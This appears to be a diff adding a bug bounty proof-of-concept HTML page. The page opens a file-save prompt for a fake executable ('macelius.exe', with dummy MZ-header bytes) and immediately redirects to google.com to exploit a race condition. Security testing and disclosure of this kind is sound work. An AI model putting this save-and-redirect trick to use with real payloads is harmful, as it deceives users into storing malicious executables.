@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirect + Save File Exploit Test</title>
+</head>
+<body>
+  <h2>Bug Bounty Test: Save EXE + Redirect</h2>
+  <button onclick="triggerBoth()">Click Me</button>
+
+  <script>
+    async function triggerBoth() {
+      try {
+        // Buat konten file palsu (binary .exe sebagai teks / dummy)
+        const exeContent = new Uint8Array([
+          0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, // Header MZ (typical for .exe)
+          0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00
+        ]);
+
+        const handlePromise = (async () => {
+          const handle = await showSaveFilePicker({
+            suggestedName: 'macelius.exe',
+            types: [
+              {
+                description: 'Executable File',
+                accept: { 'application/octet-stream': ['.exe'] }
+              }
+            ]
+          });
+
+          const writable = await handle.createWritable();
+          await writable.write(exeContent);
+          await writable.close();
+        })();
+
+        // Segera redirect
+        window.location.href = "https://google.com";
+
+        // Tetap coba selesaikan promise (jika race condition terjadi)
+        await handlePromise;
+      } catch (e) {
+        console.warn("Save file gagal atau dibatalkan:", e);
+      }
+    }
+  </script>
+</body>
+</html>
